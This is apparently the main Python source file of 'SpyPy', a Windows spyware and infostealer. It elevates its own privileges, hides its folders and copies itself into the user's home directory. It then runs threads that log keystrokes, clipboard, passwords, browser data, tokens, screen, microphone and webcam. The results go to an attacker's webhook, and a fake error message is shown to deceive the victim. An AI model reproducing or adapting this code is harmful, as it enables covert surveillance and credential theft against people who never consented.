import tempfile
import os
import threading
import shutil
import sys
import subprocess
import ctypes


from utils import *
from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.password_logger import PasswordLogger
from loggers.screen_logger import ScreenLogger
from loggers.token_logger import TokenLogger
from loggers.webcam_logger import WebcamLogger

###############################
# DO NOT MODIFY THESE VALUES! #
# THEY ARE SET BY THE BUILDER #
WEBHOOK_URL = ""  #
SOFTWARE_EXE_NAME = ""  #
SOFTWARE_DIR_NAME = ""  #
CUSTOM_ERROR_MESSAGE = None  #
###############################


class SpyPy:
    def __init__(self):
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )

        self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
        self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)

        if not os.path.exists(self.software_dir):
            os.makedirs(self.software_dir)
            hide_dir(self.software_dir)
        if not os.path.exists(self.logs_path):
            os.makedirs(self.logs_path)
            hide_dir(self.logs_path)

        self.is_exe = is_exe()
        self.first_run_flag = os.path.join(self.logs_path, f"{SOFTWARE_EXE_NAME}.flag")

        self.loggers = []
        try:
            if self.is_exe:
                logger_class_names = [
                    "BrowserLogger",
                    "ClipboardLogger",
                    "InputLogger",
                    "MicrophoneLogger",
                    "PasswordLogger",
                    "ScreenLogger",
                    "TokenLogger",
                    "WebcamLogger",
                ]
                for logger_class_name in logger_class_names:
                    if globals().get(logger_class_name):
                        self.loggers.append(
                            globals()[logger_class_name](SOFTWARE_DIR_NAME, WEBHOOK_URL)
                        )
            else:
                self.loggers = [
                    BrowserLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    ClipboardLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    InputLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    MicrophoneLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    PasswordLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    ScreenLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    TokenLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                    WebcamLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                ]
        except Exception as e:
            send_webhook(
                WEBHOOK_URL,
                f"```❌ The program encountered a fatal error while initializing loggers ({e}). The program will not run properly.```",
            )
            os._exit(1)

        self.threads = []

        self.setup()

    def start(self):
        for logger in self.loggers:
            if logger:
                thread = threading.Thread(
                    target=logger.start, name=type(logger).__name__
                )
                thread.start()
                self.threads.append(thread)

    def stop(self):
        os._exit(0)

    def setup(self):
        if self.is_exe:
            if not os.path.exists(self.first_run_flag):
                try:
                    send_webhook(
                        WEBHOOK_URL,
                        f"```✅ {SOFTWARE_EXE_NAME} has been executed for the first time. Setting up...```",
                    )
                    open(self.first_run_flag, "w").close()
                    current_exe = sys.executable
                    new_exe = os.path.join(
                        self.software_dir, os.path.basename(current_exe)
                    )
                    shutil.copyfile(current_exe, new_exe)
                    subprocess.Popen([new_exe])
                    if CUSTOM_ERROR_MESSAGE:
                        display_error_message(
                            f"A fatal error occurred while running {SOFTWARE_EXE_NAME}:",
                            CUSTOM_ERROR_MESSAGE,
                        )
                    os._exit(0)
                except Exception as e:
                    send_webhook(
                        f"```❌ The program encountered a fatal error while setting up the software on the target's computer ({e}). The program will not run properly. ```"
                    )
                    os._exit(1)
            else:
                send_webhook(
                    WEBHOOK_URL,
                    f"```✅ {SOFTWARE_EXE_NAME} has been executed. Starting SpyPy...```",
                )
                self.start()
        else:
            send_webhook(WEBHOOK_URL, f"```✅ SpyPy has been executed directly...```")
            send_webhook(WEBHOOK_URL, f"```This is for debugging purposes only. If you want to use SpyPy, please build it as an executable by running spy-py.bat.```")
            if CUSTOM_ERROR_MESSAGE:
                display_error_message("Error", CUSTOM_ERROR_MESSAGE)
            self.start()


if __name__ == "__main__":
    SpyPy().start()
